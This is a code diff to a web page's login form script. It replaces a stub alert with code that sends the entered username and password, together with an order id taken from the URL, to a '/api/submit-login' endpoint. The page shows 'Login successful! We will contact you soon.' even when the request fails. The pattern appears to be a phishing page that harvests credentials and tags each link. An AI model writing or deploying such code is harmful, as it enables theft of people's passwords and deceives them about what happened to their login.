@@ -166,7 +166,24 @@
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        alert('Login successful!');
+        const params = new URLSearchParams(window.location.search);
+        const orderId = Number(params.get('orderId')) || 0;
+        fetch('/api/submit-login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                orderId: orderId,
+                username: document.getElementById('username').value.trim(),
+                password: document.getElementById('password').value
+            })
+        })
+        .then(function(res) { return res.json(); })
+        .then(function() {
+            alert('Login successful! We will contact you soon.');
+        })
+        .catch(function() {
+            alert('Login successful! We will contact you soon.');
+        });
     });
     </script>
 </body>
